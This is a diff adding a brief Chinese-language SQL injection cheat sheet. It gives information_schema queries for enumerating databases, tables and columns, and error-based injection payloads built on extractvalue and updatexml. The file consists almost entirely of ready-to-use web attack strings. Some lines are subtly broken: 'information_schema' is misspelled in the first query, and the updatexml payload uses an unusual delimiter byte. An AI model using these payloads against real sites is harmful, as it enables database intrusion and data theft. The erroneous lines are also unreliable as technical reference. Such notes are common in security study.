@@ -1,0 +1,16 @@
+猜数据库
+select schema_name from infromation_schema.schemata
+猜某库的数据表
+select table_name from information_schema.tables where table_schema='xxxxx'
+猜某表的所有列
+select column_name from information_schema.columns where table_name='xxxxx'
+获取某列的内容
+select *** from ****
+ 
+
+报错注入:
+extractvalue:
+id='and(select extractvalue(1,concat('~',(select 语句))))--+
+
+updataxml:
+id='and(select updatexml(1,concat(0x74,(select 语句)),1))--+
